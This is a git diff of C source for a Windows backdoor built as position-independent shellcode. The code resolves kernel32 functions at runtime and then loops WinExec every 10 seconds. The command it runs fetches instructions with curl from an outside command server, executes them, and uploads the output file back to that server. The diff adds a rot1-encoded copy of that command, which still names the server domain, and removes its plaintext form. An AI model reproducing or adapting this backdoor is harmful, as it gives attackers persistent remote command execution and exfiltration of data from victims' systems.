@@ -1,5 +1,5 @@
 ﻿//Author: Shaddy43
-//Designation: Cybersecurity Engineer, reverse engineer and malware developr
+//Designation: Malware Analyst, reverse engineer and malware developer
 //Original credits to hasherezade of vxunderground who gave the methodology of creating postion independent shellcode
 //I've followed the methodology to create a complete custom backdoor communicating on c3 using https and APIs
 
@@ -20,18 +20,14 @@ void rot1(char*, size_t, bool);
 
 int main()
 {
-    // Stack based strings for libraries and functions the shellcode needs
+    // Stack based strings for libraries and functions that shellcode needs
     wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
 
-    // stack based strings to be passed to the winexec api
-    //This string_cmd takes commands from the c3 server, executes those commands on the system, saves the output in a text file and then uploads the output back to the c3 server!
-    //char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};
-    //LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl https://r.baalejibreel.com/shaddy/data.php') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" https://r.baalejibreel.com/shaddy/getfile.php\" ";
+    //This cmd is executed in WinExec, which gets command from the webpage (c3 server), executes that command on the system and finally upload the output back to the web server using Http/Https protocol.
+    //LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl URL_TO_GET_COMMANDS') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" URL_TO_UPLOAD_OUTPUT \" ";
+    
+    //simple encoding added to the command
     char cmd[] = "dne/fyf!0d!#gps!0g!#efmjnt>#!&j!jo!)(dvsm!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0ebub/qiq(*!ep!tfu!pvuqvu>&j!''!&j!?!D;]vtfst]qvcmjd]ufnq/uyu!''!dvsm!..gpsn!#gjmfUpVqmpbe>AD;]vtfst]qvcmjd]ufnq/uyu#!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0hfugjmf/qiq#!";
-    //char load_library_name[] = "MpbeMjcsbszB";
-    //char get_proc_address[] = "HfuQspdBeesftt";
-    //char winExec_name[] = "XjoFyfd";
-    //char sleep_name[] = "Tmffq";
 
 	// resolve kernel32 image base
     LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
@@ -39,23 +35,24 @@ int main()
         return 1;
     }
 
-    // resolve loadlibraryA() address along with encoding and decoding
+    // resolve loadlibraryA() address
     LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
     if (!load_lib) {
         return 2;
     }
 
-    // resolve getprocaddress() address along with encoding and decoding
+    // resolve getprocaddress() address
     LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
     if (!get_proc) {
         return 3;
     }
 
-    // loadlibrarya and getprocaddress function definitions
+    //loadlibrarya and getprocaddress function definitions
     HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
     FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
         = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
 
+    //WinExec function definition
     UINT(WINAPI * _WinExec)(
         _In_ LPCSTR lpCmdLine,
         _In_ UINT uCmdShow) = (UINT (WINAPI*)(
@@ -63,23 +60,21 @@ int main()
             _In_ UINT)) _GetProcAddress((HMODULE)base, (LPCSTR)"WinExec");
     if (_WinExec == NULL) return 4;
 
+    //Sleep function definition
     VOID(WINAPI * _Sleep)(
         _In_ DWORD dwMilliseconds) = (VOID (WINAPI*)(
             _In_ DWORD)) _GetProcAddress((HMODULE)base, (LPCSTR)"Sleep");
     if (_Sleep == NULL) return 5;
 
+    //decoding cmd
     rot1(cmd, sizeof(cmd), true);
+    //While true because the backdoor gets command from the server after every 10 sec and executes it on the system.
     while(true)
 	{
 		UINT return_val = _WinExec(cmd, 0);
         _Sleep(10000);
 	}
     rot1(cmd, sizeof(cmd), false);
-
-    //rot1(cmd, sizeof(cmd), true);
-    //UINT return_val = _WinExec(cmd, 0);
-    //rot1(cmd, sizeof(cmd), false);
-
     return 0;
 }
 
